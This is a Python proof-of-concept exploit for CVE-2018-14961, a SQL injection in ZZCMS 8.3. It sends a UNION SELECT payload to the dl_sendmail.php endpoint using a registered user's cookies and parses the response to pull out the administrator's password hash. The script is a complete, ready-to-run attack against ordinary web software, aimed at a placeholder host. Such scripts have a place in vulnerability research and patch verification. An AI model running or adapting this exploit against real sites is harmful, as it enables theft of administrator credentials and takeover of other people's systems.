# coding=utf-8
"""
DATE:   2021/6/10
AUTHOR: Yanxi Li
"""
import re
import requests

'''
CVE-2018-14961 ZZCMS 8.3 SQL Injection

ref:
https://www.anquanke.com/post/id/156660
'''

url = "http://zzcms.tt//dl/dl_sendmail.php"

# your register username and password hash
cookies = {'UserName': 'tttt', 'PassWord': 'e10adc3949ba59abbe56e057f20f883e'}
data = {'sql': 'select email from zzcms_dl where id=-1 union select pass from zzcms_admin #'}

q = requests.post(url, data, cookies=cookies, allow_redirects=False)

if q.status_code:

    ret = q.content.decode('utf-8')

    re_ret = re.findall(r"<li>?\d发送到(\w{32})失败</li>", ret)
    if len(re_ret) > 0:
        print("admin password hash is:\n", re_ret)

    else:
        print("please find admin password hash by yourself:\n")
        print(ret)
else:
    print("error status code: ", q.status_code)
